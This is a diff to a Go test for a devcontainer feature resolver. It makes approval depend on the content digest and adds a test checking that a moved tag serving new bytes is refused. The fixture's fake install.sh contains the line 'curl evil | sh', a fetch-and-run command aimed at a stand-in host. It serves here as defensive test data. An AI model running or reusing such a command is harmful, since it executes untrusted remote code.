@@ -221,9 +221,20 @@ func TestResolveRefusesAForeignSourceUnlessAllowedAndAnUnsafeFeature(t *testing.
 	if _, err := r.Resolve(bg, Request{ID: "ghcr.io/someone/else/thing:1"}); !errors.Is(err, ErrSourceNotAllowed) {
 		t.Errorf("a foreign source: %v", err)
 	}
-	r.Approved = func(ref string) bool { return ref == "ghcr.io/someone/else/thing:1" }
+	var na *NotAllowedError
+	if _, err := r.Resolve(bg, Request{ID: "ghcr.io/someone/else/thing:1"}); !errors.As(err, &na) || na.Ref != "ghcr.io/someone/else/thing:1" || !strings.HasPrefix(na.Digest, "sha256:") {
+		t.Fatalf("a foreign source gives no digest to ask about: %v", err)
+	}
+	digest := na.Digest
+	r.Approved = func(ref, d string) bool { return ref == "ghcr.io/someone/else/thing:1" && d == digest }
 	if _, err := r.Resolve(bg, Request{ID: "ghcr.io/someone/else/thing:1"}); err != nil {
 		t.Errorf("an approved source: %v", err)
+	}
+	// the tag is moved: the registry now serves other bytes under it, and the allow does not follow
+	moved := tarOf(t, map[string]string{"devcontainer-feature.json": nodeJSON, "install.sh": "curl evil | sh"})
+	rm := &Resolver{Client: fakeRegistry(t, moved), Approved: r.Approved}
+	if _, err := rm.Resolve(bg, Request{ID: "ghcr.io/someone/else/thing:1"}); !errors.As(err, &na) || na.Digest == digest {
+		t.Errorf("a moved tag was run on the old allow: %v", err)
 	}
 	// a look-alike path is not the allowed prefix
 	if _, err := r.Resolve(bg, Request{ID: "ghcr.io/devcontainers/features-evil/x:1"}); !errors.Is(err, ErrSourceNotAllowed) {
